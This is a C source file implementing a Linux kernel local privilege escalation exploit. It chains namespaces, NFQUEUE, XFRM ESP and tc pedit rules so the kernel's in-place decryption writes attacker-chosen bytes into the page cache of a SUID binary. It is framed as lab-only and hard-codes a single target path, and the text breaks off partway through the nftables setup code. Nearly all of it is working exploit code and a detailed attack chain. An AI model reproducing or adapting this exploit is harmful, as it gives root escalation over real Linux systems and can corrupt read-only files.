/*
 * ZDI-CAN-33367 — in-lab LPE closure against the lab's own SUID target.
 * Independent, safe re-implementation (S10 ethics) of the public PoC chain
 * published in ZDI's 2026-10 LKML disclosure (cached in
 * odd/research/zdi-lkml-report-33367.txt). This tool:
 *
 *   - attacks EXACTLY ONE file: /usr/bin/secretgate, the purpose-built
 *     SUID binary compiled into this lab's disposable guest. A hard-coded
 *     allowlist (path + S_ISREG + S_ISUID + root-owned) refuses anything
 *     else. No real-world binary is ever targeted.
 *   - runs as an unprivileged user (uid 1000 in the lab guest) and never
 *     opens the target for writing; the write happens through the
 *     kernel's own in-place ESP decryption over splice-backed skb frags.
 *
 * Chain (all inside unshare(CLONE_NEWUSER|CLONE_NEWNET)):
 *   1. lo up, nlmon0 up, sysctls route_localnet/accept_local on lo
 *   2. nftables IPv4 LOCAL_OUT base chain -> queue 0 (NFQUEUE)
 *   3. XFRM state 127.0.0.1->127.0.0.1 ESP transport, hmac(sha256)-128
 *      + cbc(aes), replay-window 0; matching input policy
 *   4. NFQUEUE bind (COPY_PACKET): a helper child accepts every packet
 *      and reports the netlink message geometry (frag_start)
 *   5. probe UDP packet (522 bytes spliced from a memfd): measures the
 *      frag offset inside the skb_zerocopy()-built queue message
 *   6. tc on nlmon0 egress: clsact + u32 match-all + pedit (rewrites the
 *      linear prefix into a valid authenticated ESP packet) + mirred
 *      redirect to lo
 *   7. selftest: a vector-only message proves the rewrite/decrypt path
 *      end-to-end (inner UDP arrives) BEFORE anything is aimed at the
 *      target file
 *   8. trigger: UDP payload = 8 bytes spliced from /usr/bin/secretgate
 *      at GATE_OFF + 514 vector bytes. NFQUEUE's skb_zerocopy() transfers
 *      the file's page-cache frags into the netlink message but drops
 *      the SKBFL_SHARED_FRAG marker (ZDI-CAN-33367); esp4 input then
 *      decrypts IN PLACE over those pages, planting the chosen 8 bytes
 *      ("GATEOPEN") into the page cache of the SUID binary.
 *   9. exec the (page-cache-patched) SUID secretgate as uid 1000 -> it
 *      finds GATEOPEN in its own image and prints the root-only flag.
 *
 * The 8 chosen plaintext bytes are placed via the CBC previous-block
 * trick: the AES-CBC block containing the file bytes decrypts to
 * P = D(C_file_block) XOR C_prev, and C_prev lives inside the pedit-
 * rewritten linear prefix, so P is fully attacker-chosen.
 *
 * On a kernel carrying the netdev v2 fix ("net: skbuff: propagate shared
 * frag marker in skb_zerocopy()", unmerged as of 2026-10-26),
 * skb_has_shared_frag() is true on the netlink skb, esp4 input calls
 * skb_cow_data(), the frags are copied before decryption and NOTHING is
 * written to the file — the differential oracle.
 *
 * Protocol (stable strings, grepped by lab/scripts/run.sh):
 *   LPE-RESULT: ROOT-FLAG-CAPTURED <flag>   exit 0 (vulnerable)
 *   LPE-RESULT: NOT-VULNERABLE              exit 1 (patched kernel)
 *   LPE-RESULT: FAILED ...                  exit 2 (setup/expectation)
 *
 * Compile: gcc -static -O2 -Wall -Wextra \
 *     -DGATE_OFF=<decimal offset of "GATELOCK" in lab/out/secretgate> \
 *     -o lpe lpe.c
 * No external dependencies; all UAPI constants used here are defined
 * locally so plain libc headers suffice.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/udp.h>
#include <net/if.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* ------------------------------------------------------------------ */
/* S10 ethics: the only file this tool will ever touch                  */
/* ------------------------------------------------------------------ */
#define TARGET_PATH "/usr/bin/secretgate"

#ifndef GATE_OFF
#error "compile with -DGATE_OFF=<file offset of the gate bytes in secretgate>"
#endif

/* Gate convention (shared with lab/rootfs/tools/secretgate.c):
 * "GATELOCK" (8 bytes, factory) -> "GATEOPEN" (8 bytes, patched). */
static const uint8_t GATE_LOCKED[8] = { 'G','A','T','E','L','O','C','K' };
static const uint8_t GATE_OPEN[8]   = { 'G','A','T','E','O','P','E','N' };

/* ------------------------------------------------------------------ */
/* Chain constants (ours; deliberately not the public PoC's)            */
/* ------------------------------------------------------------------ */
#define SPI_VAL    0x33360001u
#define UDP_PORT   45567
#define TGT_BYTES  8                       /* bytes spliced from target */
#define PAYLOAD    522                     /* probe/trigger UDP payload */
#define VEC_LEN    (PAYLOAD - TGT_BYTES)   /* 514, independent of geom  */
#define FS_MIN     96                      /* allowed frag_start window */
#define FS_MAX     112                     /* pedit key budget: 28 keys */
#define AUTH_KEY   "ZDI-CAN-33367-lab-auth-key#01234"  /* 32 bytes */
#define ENC_KEY    "33367-lab-enc-01"                     /* 16 bytes */
#define AUTH_TRUNC 128                     /* bits */
#define IV_LEN     16
#define BLK        16
#define PATTERN    0xa5
#define NFT_TABLE  "zfq"
#define NFT_CHAIN  "outq"
#define NL_MON     "nlmon0"
#define ETH_HDR    14
#define IP_HDR     20
#define ESP_HDR    8
#define HDRS       (ETH_HDR + IP_HDR + ESP_HDR + IV_LEN)  /* 58 */

/* ------------------------------------------------------------------ */
/* Local UAPI constants (UAPI-stable numbers; kept local so plain libc
 * headers are enough to build the tool)                               */
/* ------------------------------------------------------------------ */
#define NL_NETFILTER 12
#define NL_XFRM      6

#define NFPROTO_IPV4_         2
#define NFNETLINK_V0_         0
#define NFNL_SUBSYS_NFTABLES_ 10
#define NFNL_SUBSYS_QUEUE_    3
#define NFNL_MSG_BATCH_BEGIN_ 16
#define NFNL_MSG_BATCH_END_   17

#ifndef NF_INET_LOCAL_OUT
#define NF_INET_LOCAL_OUT 3
#endif
#ifndef NF_ACCEPT
#define NF_ACCEPT 1
#endif
#ifndef IPPROTO_ESP
#define IPPROTO_ESP 50
#endif

/* nftables */
#define NFT_MSG_NEWTABLE_      0
#define NFT_MSG_NEWCHAIN_      2
#define NFT_MSG_NEWRULE_       6
#define NFTA_TABLE_NAME_       1
#define NFTA_CHAIN_TABLE_      1
#define NFTA_CHAIN_NAME_       3
#define NFTA_CHAIN_HOOK_       4
#define NFTA_CHAIN_TYPE_       7
#define NFTA_HOOK_HOOKNUM_     1
#define NFTA_HOOK_PRIORITY_    2
#define NFTA_RULE_TABLE_       1
#define NFTA_RULE_CHAIN_       2
#define NFTA_RULE_EXPRESSIONS_ 4
#define NFTA_LIST_ELEM_        1
#define NFTA_EXPR_NAME_        1
#define NFTA_EXPR_DATA_        2
#define NFTA_QUEUE_NUM_        1

/* nfnetlink_queue */
#define NFQNL_MSG_PACKET_   0
#define NFQNL_MSG_VERDICT_  1
#define NFQNL_MSG_CONFIG_   2
#define NFQA_PACKET_HDR_    1
#define NFQA_VERDICT_HDR_   2
#define NFQA_PAYLOAD_       10
#define NFQA_CFG_CMD_       1
#define NFQA_CFG_PARAMS_    2
#define NFQA_CFG_FLAGS_     5
#define NFQA_CFG_MASK_      6
#define NFQNL_CFG_CMD_BIND_ 3
#define NFQNL_COPY_PACKET_  2
#define NFQA_CFG_F_GSO_     0x4
#define NFQA_CFG_F_UID_GID_ 0x8

/* xfrm */
#define XFRM_MSG_NEWSA_      16
#define XFRM_MSG_NEWPOLICY_  19
#define XFRMA_ALG_CRYPT_      2
#define XFRMA_TMPL_           5
#define XFRMA_ALG_AUTH_TRUNC_ 20
#define XFRM_MODE_TRANSPORT_  0
#define XFRM_POLICY_IN_       0

/* tc */
#define TC_H_CLSACT_      0xffe00000u
#define TC_H_MIN_EGRESS_  0xfffeu
#define TC_ACT_PIPE_      3
#define TC_ACT_STOLEN_    4
#define TCA_KIND_         1
#define TCA_OPTIONS_      2
#define TCA_U32_SEL_      3
#define TCA_U32_ACT_      4
#define TCA_ACT_KIND_     1
#define TCA_ACT_OPTIONS_  2
#define TCA_PEDIT_PARMS_  2
#define TCA_MIRRED_PARMS_ 2
#define TCA_EGRESS_REDIR_ 1
#define TC_U32_TERMINAL_  1
#define IFLA_IFNAME_      3
#define IFLA_LINKINFO_    18
#define IFLA_INFO_KIND_   1
#define RTM_NEWQDISC_     36
#define RTM_NEWTFILTER_   44

#define HTONS(x) ((uint16_t)((((x) & 0xff) << 8) | (((x) >> 8) & 0xff)))

/* ------------------------------------------------------------------ */
/* logging                                                              */
/* ------------------------------------------------------------------ */
static void P(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    putchar('\n');
    fflush(stdout);
}

static void fatal(const char *what)
{
    P("LPE-RESULT: FAILED %s: %s (errno=%d)", what, strerror(errno), errno);
    exit(2);
}

static void refused(const char *why)
{
    P("LPE-REFUSED target=%s (%s)", TARGET_PATH, why);
    P("LPE-RESULT: FAILED allowlist refused the target");
    exit(2);
}

/* ------------------------------------------------------------------ */
/* AES-128 (tables derived at runtime — no hand-copied S-boxes)         */
/* ------------------------------------------------------------------ */
static uint8_t SBOX[256], INV_SBOX[256];

static uint8_t gf_mul(uint8_t a, uint8_t b)
{
    uint8_t p = 0;
    while (b) {
        if (b & 1)
            p ^= a;
        a = (uint8_t)((a << 1) ^ ((a & 0x80) ? 0x1b : 0));
        b >>= 1;
    }
    return p;
}

static uint8_t gf_inv(uint8_t a) /* a^254 == a^-1 in GF(2^8) */
{
    uint8_t r = 1, base = a;
    int e;
    for (e = 0; e < 7; e++) {
        base = gf_mul(base, base);
        if ((254 >> e) & 1)
            r = gf_mul(r, base);
    }
    return r;
}

static void aes_init_tables(void)
{
    int i;
    for (i = 0; i < 256; i++) {
        uint8_t inv = gf_inv((uint8_t)i);
        uint8_t s = (uint8_t)(inv ^ (uint8_t)((inv << 1) | (inv >> 7)) ^
                              (uint8_t)((inv << 2) | (inv >> 6)) ^
                              (uint8_t)((inv << 3) | (inv >> 5)) ^
                              (uint8_t)((inv << 4) | (inv >> 4)) ^ 0x63);
        SBOX[i] = s;
    }
    for (i = 0; i < 256; i++)
        INV_SBOX[SBOX[i]] = (uint8_t)i;
}

static void aes128_expand(const uint8_t key[16], uint8_t rk[176])
{
    int i;
    uint8_t rcon = 1;
    memcpy(rk, key, 16);
    for (i = 16; i < 176; i += 4) {
        uint8_t t[4];
        memcpy(t, rk + i - 4, 4);
        if (i % 16 == 0) {
            uint8_t f = t[0];
            t[0] = (uint8_t)(SBOX[t[1]] ^ rcon);
            t[1] = SBOX[t[2]];
            t[2] = SBOX[t[3]];
            t[3] = SBOX[f];
            rcon = gf_mul(rcon, 2);
        }
        rk[i + 0] = (uint8_t)(rk[i - 16 + 0] ^ t[0]);
        rk[i + 1] = (uint8_t)(rk[i - 16 + 1] ^ t[1]);
        rk[i + 2] = (uint8_t)(rk[i - 16 + 2] ^ t[2]);
        rk[i + 3] = (uint8_t)(rk[i - 16 + 3] ^ t[3]);
    }
}

static void mix_col(uint8_t *p, const uint8_t m[4])
{
    uint8_t a0 = p[0], a1 = p[1], a2 = p[2], a3 = p[3];
    p[0] = (uint8_t)(gf_mul(a0, m[0]) ^ gf_mul(a1, m[1]) ^ gf_mul(a2, m[2]) ^ gf_mul(a3, m[3]));
    p[1] = (uint8_t)(gf_mul(a0, m[1]) ^ gf_mul(a1, m[0]) ^ gf_mul(a2, m[3]) ^ gf_mul(a3, m[2]));
    p[2] = (uint8_t)(gf_mul(a0, m[2]) ^ gf_mul(a1, m[3]) ^ gf_mul(a2, m[0]) ^ gf_mul(a3, m[1]));
    p[3] = (uint8_t)(gf_mul(a0, m[3]) ^ gf_mul(a1, m[2]) ^ gf_mul(a2, m[1]) ^ gf_mul(a3, m[0]));
}

static const uint8_t M_MIX[4]  = { 2, 3, 1, 1 };
static const uint8_t M_IMIX[4] = { 14, 11, 13, 9 };

static void aes128_enc(const uint8_t rk[176], const uint8_t in[16], uint8_t out[16])
{
    uint8_t s[16];
    int r, i, c;
    uint8_t t;

    memcpy(s, in, 16);
    for (i = 0; i < 16; i++)
        s[i] ^= rk[i];
    for (r = 1; r <= 10; r++) {
        for (i = 0; i < 16; i++)
            s[i] = SBOX[s[i]];
        t = s[1];  s[1]  = s[5];  s[5]  = s[9];  s[9]  = s[13]; s[13] = t;
        t = s[2];  s[2]  = s[10]; s[10] = t;     t = s[6];  s[6]  = s[14]; s[14] = t;
        t = s[15]; s[15] = s[11]; s[11] = s[7];  s[7]  = s[3];  s[3]  = t;
        if (r != 10)
            for (c = 0; c < 4; c++)
                mix_col(s + c * 4, M_MIX);
        for (i = 0; i < 16; i++)
            s[i] ^= rk[r * 16 + i];
    }
    memcpy(out, s, 16);
}

static void aes128_dec(const uint8_t rk[176], const uint8_t in[16], uint8_t out[16])
{
    uint8_t s[16], drk[176];
    int r, i, c;
    uint8_t t;

    /* equivalent inverse cipher: InvMixColumns the middle round keys */
    memcpy(drk, rk, 176);
    for (r = 1; r <= 9; r++)
        for (c = 0; c < 4; c++)
            mix_col(drk + r * 16 + c * 4, M_IMIX);
    memcpy(s, in, 16);
    for (i = 0; i < 16; i++)
        s[i] ^= drk[160 + i];
    for (r = 9; r >= 0; r--) {
        t = s[13]; s[13] = s[9];  s[9]  = s[5];  s[5]  = s[1];  s[1] = t;
        t = s[2];  s[2]  = s[10]; s[10] = t;     t = s[6];  s[6]  = s[14]; s[14] = t;
        t = s[3];  s[3]  = s[7];  s[7]  = s[11]; s[11] = s[15]; s[15] = t;
        for (i = 0; i < 16; i++)
            s[i] = INV_SBOX[s[i]];
        for (i = 0; i < 16; i++)
            s[i] ^= drk[r * 16 + i];
        if (r != 0)
            for (c = 0; c < 4; c++)
                mix_col(s + c * 4, M_IMIX);
    }
    memcpy(out, s, 16);
}

/* ------------------------------------------------------------------ */
/* SHA-256 + HMAC-SHA256                                                */
/* ------------------------------------------------------------------ */
static const uint32_t SHA_K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
    0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
    0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
    0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
    0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
    0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

typedef struct {
    uint32_t h[8];
    uint64_t len;
    uint8_t buf[64];
    size_t buflen;
} sha256_ctx;

static uint32_t ror32(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }

static void sha256_compress(sha256_ctx *c, const uint8_t *p)
{
    uint32_t w[64], a, b, cc, d, e, f, g, h;
    int i;
    for (i = 0; i < 16; i++)
        w[i] = ((uint32_t)p[i * 4] << 24) | ((uint32_t)p[i * 4 + 1] << 16) |
               ((uint32_t)p[i * 4 + 2] << 8) | (uint32_t)p[i * 4 + 3];
    for (i = 16; i < 64; i++) {
        uint32_t s0 = ror32(w[i - 15], 7) ^ ror32(w[i - 15], 18) ^ (w[i - 15] >> 3);
        uint32_t s1 = ror32(w[i - 2], 17) ^ ror32(w[i - 2], 19) ^ (w[i - 2] >> 10);
        w[i] = w[i - 16] + s0 + w[i - 7] + s1;
    }
    a = c->h[0]; b = c->h[1]; cc = c->h[2]; d = c->h[3];
    e = c->h[4]; f = c->h[5]; g = c->h[6]; h = c->h[7];
    for (i = 0; i < 64; i++) {
        uint32_t S1 = ror32(e, 6) ^ ror32(e, 11) ^ ror32(e, 25);
        uint32_t ch = (e & f) ^ (~e & g);
        uint32_t t1 = h + S1 + ch + SHA_K[i] + w[i];
        uint32_t S0 = ror32(a, 2) ^ ror32(a, 13) ^ ror32(a, 22);
        uint32_t mj = (a & b) ^ (a & cc) ^ (b & cc);
        uint32_t t2 = S0 + mj;
        h = g; g = f; f = e; e = d + t1;
        d = cc; cc = b; b = a; a = t1 + t2;
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d;
    c->h[4] += e; c->h[5] += f; c->h[6] += g; c->h[7] += h;
}

static void sha256_init(sha256_ctx *c)
{
    static const uint32_t H0[8] = {
        0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
        0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19
    };
    memcpy(c->h, H0, sizeof(H0));
    c->len = 0;
    c->buflen = 0;
}

static void sha256_update(sha256_ctx *c, const void *data, size_t n)
{
    const uint8_t *p = data;
    c->len += n;
    while (n) {
        size_t take = 64 - c->buflen;
        if (take > n)
            take = n;
        memcpy(c->buf + c->buflen, p, take);
        c->buflen += take;
        p += take;
        n -= take;
        if (c->buflen == 64) {
            sha256_compress(c, c->buf);
            c->buflen = 0;
        }
    }
}

static void sha256_final(sha256_ctx *c, uint8_t out[32])
{
    uint64_t bits = c->len * 8;
    uint8_t pad = 0x80, zero = 0;
    int i;
    sha256_update(c, &pad, 1);
    while (c->buflen != 56)
        sha256_update(c, &zero, 1);
    for (i = 7; i >= 0; i--) {
        uint8_t b = (uint8_t)(bits >> (i * 8));
        sha256_update(c, &b, 1);
    }
    for (i = 0; i < 8; i++) {
        out[i * 4 + 0] = (uint8_t)(c->h[i] >> 24);
        out[i * 4 + 1] = (uint8_t)(c->h[i] >> 16);
        out[i * 4 + 2] = (uint8_t)(c->h[i] >> 8);
        out[i * 4 + 3] = (uint8_t)(c->h[i]);
    }
}

static void sha256(const void *data, size_t n, uint8_t out[32])
{
    sha256_ctx c;
    sha256_init(&c);
    sha256_update(&c, data, n);
    sha256_final(&c, out);
}

static void hmac_sha256(const uint8_t *key, size_t klen,
                        const void *msg, size_t mlen, uint8_t out[32])
{
    uint8_t k[64], ipad[64], opad[64], inner[32];
    sha256_ctx c;
    size_t i;
    memset(k, 0, 64);
    if (klen > 64)
        sha256(key, klen, k);
    else
        memcpy(k, key, klen);
    for (i = 0; i < 64; i++) {
        ipad[i] = (uint8_t)(k[i] ^ 0x36);
        opad[i] = (uint8_t)(k[i] ^ 0x5c);
    }
    sha256_init(&c);
    sha256_update(&c, ipad, 64);
    sha256_update(&c, msg, mlen);
    sha256_final(&c, inner);
    sha256_init(&c);
    sha256_update(&c, opad, 64);
    sha256_update(&c, inner, 32);
    sha256_final(&c, out);
}

static void hexs(const uint8_t *b, size_t n, char *out)
{
    size_t i;
    for (i = 0; i < n; i++)
        sprintf(out + i * 2, "%02x", b[i]);
}

/* ------------------------------------------------------------------ */
/* netlink mini-toolkit                                                 */
/* ------------------------------------------------------------------ */
static uint32_t nl_seq;

static struct nlmsghdr *nl_hdr(char *buf, uint16_t type, uint16_t flags,
                               size_t extra)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    memset(nlh, 0, NLMSG_LENGTH(extra));
    nlh->nlmsg_len = NLMSG_LENGTH(extra);
    nlh->nlmsg_type = type;
    nlh->nlmsg_flags = (uint16_t)(flags | NLM_F_REQUEST);
    nlh->nlmsg_seq = ++nl_seq;
    return nlh;
}

static void nl_attr(struct nlmsghdr *nlh, uint16_t type,
                    const void *data, size_t len)
{
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    size_t pad = NLA_ALIGN(len) - len;
    a->nla_type = type;
    a->nla_len = (uint16_t)(NLA_HDRLEN + len);
    if (len)
        memcpy((char *)a + NLA_HDRLEN, data, len);
    if (pad)
        memset((char *)a + NLA_HDRLEN + len, 0, pad);
    nlh->nlmsg_len = (uint32_t)(NLMSG_ALIGN(nlh->nlmsg_len) + NLA_HDRLEN +
                                NLA_ALIGN(len));
}

static struct nlattr *nl_nest(struct nlmsghdr *nlh, uint16_t type)
{
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    nl_attr(nlh, (uint16_t)(type | NLA_F_NESTED), NULL, 0);
    return a;
}

static void nl_nest_end(struct nlmsghdr *nlh, struct nlattr *a)
{
    a->nla_len = (uint16_t)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)a);
}

static void nl_attr_str(struct nlmsghdr *nlh, uint16_t type, const char *s)
{
    nl_attr(nlh, type, s, strlen(s) + 1);
}

static void nl_attr_u16(struct nlmsghdr *nlh, uint16_t type, uint16_t v)
{
    nl_attr(nlh, type, &v, 2);
}

static void nl_attr_u32be(struct nlmsghdr *nlh, uint16_t type, uint32_t v)
{
    nl_attr(nlh, type, &v, 4);
}

static int nl_socket_open(int proto)
{
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    int fd = socket(AF_NETLINK, SOCK_RAW, proto);
    if (fd < 0)
        return -1;
    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* send one NLM_F_ACK message, return 0 on ACK (negative errno on error) */
static int nl_talk_ack(int fd, char *buf)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    char rbuf[8192];
    ssize_t n;

    if (sendto(fd, buf, nlh->nlmsg_len, 0,
               (struct sockaddr *)&sa, sizeof(sa)) < 0)
        return -1;
    for (;;) {
        struct nlmsghdr *r;
        n = recv(fd, rbuf, sizeof(rbuf), 0);
        if (n <= 0)
            return -1;
        for (r = (struct nlmsghdr *)rbuf; NLMSG_OK(r, (unsigned)n);
             r = NLMSG_NEXT(r, n)) {
            if (r->nlmsg_seq != nlh->nlmsg_seq)
                continue;
            if (r->nlmsg_type == NLMSG_ERROR)
                return ((struct nlmsgerr *)NLMSG_DATA(r))->error;
        }
    }
}

/* ------------------------------------------------------------------ */
/* namespace + link setup                                               */
/* ------------------------------------------------------------------ */
static int write_file(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    size_t len = strlen(data);
    int ok = fd >= 0 && write(fd, data, len) == (ssize_t)len;
    if (fd >= 0)
        close(fd);
    return ok ? 0 : -1;
}

static int link_flags(const char *ifname, short or_mask)
{
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    int rc = -1;
    if (s < 0)
        return -1;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
        ifr.ifr_flags = (short)(ifr.ifr_flags | or_mask);
        rc = ioctl(s, SIOCSIFFLAGS, &ifr);
    }
    close(s);
    return rc;
}

static int ifindex_of(const char *ifname)
{
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    int idx = 0;
    if (s < 0)
        return 0;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) == 0)
        idx = ifr.ifr_ifindex;
    close(s);
    return idx;
}

static int create_nlmon(void)
{
    char buf[512];
    int fd, rc;
    struct nlmsghdr *nlh;
    struct ifinfomsg *ifi;
    struct nlattr *li;

    if (ifindex_of(NL_MON))
        return 0;
    fd = nl_socket_open(NETLINK_ROUTE);
    if (fd < 0)
        return -1;
    nlh = nl_hdr(buf, RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                 sizeof(*ifi));
    ifi = NLMSG_DATA(nlh);
    ifi->ifi_family = AF_UNSPEC;
    ifi->ifi_change = 0xffffffff;
    nl_attr_str(nlh, IFLA_IFNAME_, NL_MON);
    li = nl_nest(nlh, IFLA_LINKINFO_);
    nl_attr_str(nlh, IFLA_INFO_KIND_, "nlmon");
    nl_nest_end(nlh, li);
    rc = nl_talk_ack(fd, buf);
    close(fd);
    return rc;
}

/* ------------------------------------------------------------------ */
/* XFRM state + policy (what `ip xfrm state/policy add` would do)       */
/* ------------------------------------------------------------------ */
typedef union { uint32_t a4; uint32_t a6[4]; } xfrm_addr;

struct xfrm_algo_c { char alg_name[64]; uint32_t alg_key_len; char alg_key[]; };
struct xfrm_algo_a {
    char alg_name[64]; uint32_t alg_key_len; uint32_t alg_trunc_len;
    char alg_key[];
};
struct xfrm_sel {
    xfrm_addr daddr, saddr;
    uint16_t dport, dport_mask, sport, sport_mask;
    uint16_t family;
    uint8_t prefixlen_d, prefixlen_s;
    int ifindex;
    uint32_t user;
};
struct xfrm_lft_cfg { uint64_t v[8]; };
struct xfrm_lft_cur { uint64_t v[4]; };
struct xfrm_stats { uint32_t v[3]; };
struct xfrm_id { xfrm_addr daddr; uint32_t spi; uint8_t proto; };
struct xfrm_usersa {
    struct xfrm_sel sel;
    struct xfrm_id id;
    xfrm_addr saddr;
    struct xfrm_lft_cfg lft;
    struct xfrm_lft_cur curlft;
    struct xfrm_stats stats;
    uint32_t seq, reqid;
    uint16_t family;
    uint8_t mode, replay_window, flags, pad;
};
struct xfrm_userpol {
    struct xfrm_sel sel;
    struct xfrm_lft_cfg lft;
    struct xfrm_lft_cur curlft;
    uint32_t priority, index;
    uint8_t dir, action, flags, share;
};
struct xfrm_tmpl {
    struct xfrm_id id;
    xfrm_addr saddr;
    uint32_t reqid;
    uint8_t mode;
    uint16_t share;
    uint8_t optional;
    uint32_t aalgos, ealgos, calgos;
};

static void lft_infinite(struct xfrm_lft_cfg *l)
{
    int i;
    for (i = 0; i < 8; i++)
        l->v[i] = ~0ULL;
}

static int xfrm_setup(void)
{
    char buf[1024];
    int fd = nl_socket_open(NL_XFRM);
    int rc;
    struct nlmsghdr *nlh;
    struct xfrm_usersa *sa;
    struct xfrm_userpol *pol;
    struct xfrm_algo_a *aa;
    struct xfrm_algo_c *ac;
    struct xfrm_tmpl *tm;

    if (fd < 0)
        return -1;

    /* state: 127.0.0.1 -> 127.0.0.1, ESP transport, hmac(sha256)-128 +
     * cbc(aes), replay-window 0 */
    nlh = nl_hdr(buf, XFRM_MSG_NEWSA_, NLM_F_CREATE | NLM_F_ACK, sizeof(*sa));
    sa = NLMSG_DATA(nlh);
    sa->id.daddr.a4 = htonl(INADDR_LOOPBACK);
    sa->id.spi = htonl(SPI_VAL);
    sa->id.proto = IPPROTO_ESP;
    sa->saddr.a4 = htonl(INADDR_LOOPBACK);
    sa->family = AF_INET;
    sa->mode = XFRM_MODE_TRANSPORT_;
    sa->replay_window = 0;
    lft_infinite(&sa->lft);
    aa = calloc(1, sizeof(*aa) + 32);
    strcpy(aa->alg_name, "hmac(sha256)");
    aa->alg_key_len = 256;
    aa->alg_trunc_len = AUTH_TRUNC;
    memcpy(aa->alg_key, AUTH_KEY, 32);
    nl_attr(nlh, XFRMA_ALG_AUTH_TRUNC_, aa, sizeof(*aa) + 32);
    free(aa);
    ac = calloc(1, sizeof(*ac) + 16);
    strcpy(ac->alg_name, "cbc(aes)");
    ac->alg_key_len = 128;
    memcpy(ac->alg_key, ENC_KEY, 16);
    nl_attr(nlh, XFRMA_ALG_CRYPT_, ac, sizeof(*ac) + 16);
    free(ac);
    rc = nl_talk_ack(fd, buf);
    if (rc)
        goto out;

    /* policy: dir in, 127.0.0.1/32 -> 127.0.0.1/32, tmpl esp transport */
    nlh = nl_hdr(buf, XFRM_MSG_NEWPOLICY_, NLM_F_CREATE | NLM_F_ACK, sizeof(*pol));
    pol = NLMSG_DATA(nlh);
    pol->sel.daddr.a4 = htonl(INADDR_LOOPBACK);
    pol->sel.saddr.a4 = htonl(INADDR_LOOPBACK);
    pol->sel.family = AF_INET;
    pol->sel.prefixlen_d = 32;
    pol->sel.prefixlen_s = 32;
    pol->dir = XFRM_POLICY_IN_;
    pol->action = 0; /* allow */
    lft_infinite(&pol->lft);
    tm = calloc(1, sizeof(*tm));
    tm->id.proto = IPPROTO_ESP;
    tm->id.spi = htonl(SPI_VAL);
    tm->id.daddr.a4 = htonl(INADDR_LOOPBACK);
    tm->mode = XFRM_MODE_TRANSPORT_;
    tm->aalgos = tm->ealgos = tm->calgos = ~0u;
    nl_attr(nlh, XFRMA_TMPL_, tm, sizeof(*tm));
    free(tm);
    rc = nl_talk_ack(fd, buf);
out:
    close(fd);
    return rc;
}

/* ------------------------------------------------------------------ */
/* nftables: IPv4 LOCAL_OUT base chain queuing everything to queue 0    */
/* ------------------------------------------------------------------ */
struct nfgen { uint8_t family, version; uint16_t res_id; };

static struct nlmsghdr *nft_add(char *buf, size_t *off, uint16_t type,
                                uint8_t family, uint16_t flags)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    struct nfgen *n;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*n));
    nlh->nlmsg_type = (uint16_t)((NFNL_SUBSYS_NFTABLES_ << 8) | type);
    nlh->nlmsg_flags = (uint16_t)(NLM_F_REQUEST | flags);
    nlh->nlmsg_seq = ++nl_seq;
    n = NLMSG_DATA(nlh);
    n->family = family;
    n->version = NFNETLINK_V0_;
    n->res_id = 0;
    return nlh;
}

static void nft_done(char *buf, size_t *off)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    *off += NLMSG_ALIGN(nlh->nlmsg_len);
}

static int nft_queue_setup(void)
{
    char buf[4096];
    size_t off = 0;
